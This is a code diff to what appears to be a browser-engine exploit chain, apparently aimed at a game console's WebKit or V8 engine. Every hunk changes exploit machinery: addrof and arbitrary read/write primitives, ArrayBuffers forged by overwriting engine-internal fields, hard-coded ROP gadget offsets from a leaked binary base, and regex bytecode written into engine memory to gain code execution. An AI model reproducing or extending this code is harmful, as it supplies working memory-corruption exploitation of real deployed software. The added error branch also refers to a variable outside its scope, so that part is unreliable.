@@ -14,11 +14,11 @@ let syscall_wrapper = 0n;
 const mem = {
   allocs: new Map(),
   /**
-   * @param {number} sz
+   * @param {number} size
    * @return {BigInt}
    */
-  alloc(sz) {
-    const buf = new ArrayBuffer(sz);
+  alloc(size) {
+    const buf = new ArrayBuffer(size);
     const backing_store = buf.getBackingStore();
     this.allocs.set(backing_store, buf);
     return buf.getBackingStore();
@@ -34,20 +34,20 @@ const mem = {
   /**
    * @param {BigInt} dst
    * @param {BigInt} src
-   * @param {number} sz
+   * @param {number} size
    */
-  copy(dst, src, sz) {
-    const src_arr = new Uint8Array(ArrayBuffer.from(src, sz));
-    const dst_arr = new Uint8Array(ArrayBuffer.from(dst, sz));
+  copy(dst, src, size) {
+    const src_arr = new Uint8Array(ArrayBuffer.from(src, size));
+    const dst_arr = new Uint8Array(ArrayBuffer.from(dst, size));
 
     dst_arr.set(src_arr);
   },
   /**
    * @param {BigInt} addr
-   * @param {number} sz
+   * @param {number} size
    */
-  bset(addr, sz, value = 0) {
-    const arr = new Uint8Array(ArrayBuffer.from(addr, sz));
+  bset(addr, size, value = 0) {
+    const arr = new Uint8Array(ArrayBuffer.from(addr, size));
     arr.fill(value);
   },
   /**
@@ -66,22 +66,6 @@ const mem = {
     }
 
     return len;
-  },
-  /** @param {BigInt} addr */
-  resolve_reloc(addr) {
-    // FixedArray may relocate in memory space based on GC doing scavenge or marksweep with intervals
-    // if so, it replaces old FixedArray.map with addr of new FixedArray with original FixedArray.map
-    // once all references to FixedArray are updated to new FixedArray it will collect old FixedArray
-    // we update our cached addr as well to avoid UAF by testing FixedArray.map until tagged is found
-
-    let map_or_addr;
-
-    while (((map_or_addr = arw.view(addr).getBigUint64(0, true)) & 1n) === 0n) {
-      // map if tagged, addr of new relocation by GC if untagged
-      addr = map_or_addr;
-    }
-
-    return addr;
   },
 };
 
@@ -429,7 +413,7 @@ const gadgets = {
     return eboot_base + 0x982b90n;
   },
   get LOCK_XADD_QWORD_PTR_RDI_RAX_RET() {
-    return eboot_base + 0xf130b9n
+    return eboot_base + 0xf130b9n;
   },
   get MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8() {
     return eboot_base + 0x25ae3n;
@@ -519,7 +503,6 @@ const rop = {
     this.impl.restore_return();
     this.impl.return_fail();
     this.impl.execute();
-    this.impl.reset();
   },
   get_eboot_base() {
     const eboot_base_addr = mem.alloc(8);
@@ -537,7 +520,6 @@ const rop = {
     this.impl.restore_return();
     this.impl.return_fail();
     this.impl.execute();
-    this.impl.reset();
 
     const eboot_base = (gadgets.base = arw.view(eboot_base_addr).getBigUint64(0, true));
 
@@ -887,22 +869,33 @@ class BCRegExp extends RegExp {
 
     this.exec(BCRegExp.#str);
 
-    this.latin1_bytecode_addr = arw.view(data_addr).getBigUint64(0x38, true).untag(); // JSRegExp.data.Latin1Bytecode
-    logger?.debug(`latin1_bytecode_addr: ${this.latin1_bytecode_addr.hex()}`);
+    this.view = new Uint32Array(0x80);
 
     this.reset();
   }
 
   reset() {
     this.reg = BCRegExp.#return_reg;
-    this.offset = 0;
+    this.current = 0;
+    this.view.fill(0);
+  }
+
+  flush() {
+    const regex_addr = arw.addrof(this);
+    const data_addr = arw.view(regex_addr).getBigUint64(0x18, true).untag(); // JSRegExp.data
+    const latin1_bytecode_addr = arw.view(data_addr).getBigUint64(0x38, true).untag(); // JSRegExp.data.Latin1Bytecode
+    const fixedarray_data_addr = latin1_bytecode_addr + 0x10n; // &FixedArray.data[0]
+
+    mem.copy(fixedarray_data_addr, this.view.buffer.getBackingStore(), this.view.byteLength);
   }
 
   /** @param {number|BigInt} value */
   emit32(value) {
-    this.latin1_bytecode_addr = mem.resolve_reloc(this.latin1_bytecode_addr);
-    arw.view(this.latin1_bytecode_addr).setUint32(0x10 + this.offset, Number(value), true); // &FixedArray.data[0]
-    this.offset += 4;
+    if (this.current === this.view.length) {
+      throw new Error("bytecode full !!");
+    }
+
+    this.view[this.current++] = Number(value);
   }
 
   /**
@@ -1035,7 +1028,9 @@ class BCRegExp extends RegExp {
   }
 
   execute() {
+    this.flush();
     this.exec(BCRegExp.#str);
+    this.reset();
   }
 
   static disable_regexp_tier_up() {
@@ -1432,19 +1427,39 @@ ArrayBuffer.from = function (addr, size = -1) {
 
   const buf = new ArrayBuffer(0);
 
-  const buf_addr = arw.addrof(buf);
+  while (buf.byteLength === 0) {
+    const buf_addr = arw.addrof(buf);
 
-  arw.view(buf_addr).setBigUint64(0x18, size.bigint(), true); // JSArrayBuffer.byte_length
-  arw.view(buf_addr).setBigUint64(0x20, addr, true); // JSArrayBuffer.backing_store
-  arw.view(buf_addr).setBigUint64(0x30, 1n, true); // JSArrayBuffer.bit_field
+    arw.view(buf_addr).setBigUint64(0x18, size.bigint(), true); // JSArrayBuffer.byte_length
+    arw.view(buf_addr).setBigUint64(0x20, addr, true); // JSArrayBuffer.backing_store
+    arw.view(buf_addr).setBigUint64(0x28, 0n, true); // JSArrayBuffer.extension
+    arw.view(buf_addr).setBigUint64(0x30, 1n, true); // JSArrayBuffer.bit_field
+  }
 
-  const extension = arw.view(buf_addr).getBigUint64(0x28, true); // JSArrayBuffer.extension
-  const backing_store = arw.view(extension).getBigUint64(8, true); // ArrayBufferExtension.backing_store_
+  if (buf.byteLength === 0) {
+    logger?.debug(`buf_addr: ${buf_addr.hex()}`);
+    logger?.debug(`addrof(buf): ${arw.addrof(buf).hex()}`);
 
-  arw.view(backing_store).setBigUint64(0, addr, true); // BackingStore.buffer_start_
-  arw.view(backing_store).setBigUint64(8, size.bigint(), true); // BackingStore.byte_length_
-  arw.view(backing_store).setBigUint64(0x10, size.bigint(), true); // BackingStore.byte_capacity_
-  arw.view(backing_store).setBigUint64(0x30, 0n, true); // &BackingStore.is_shared_
+    for (let i = 0; i < 9; i++) {
+      logger?.debug(
+        `buf_addr[${i}]: ${arw
+          .view(buf_addr)
+          .getBigUint64(i * 8, true)
+          .hex()}`,
+      );
+    }
+
+    for (let i = 0; i < 9; i++) {
+      logger?.debug(
+        `addrof(buf)[${i}]: ${arw
+          .view(arw.addrof(buf))
+          .getBigUint64(i * 8, true)
+          .hex()}`,
+      );
+    }
+
+    throw new Error(`Unable to fake ArrayBuffer for ${addr.hex()} with size ${size.hex()}`);
+  }
 
   return buf;
 };
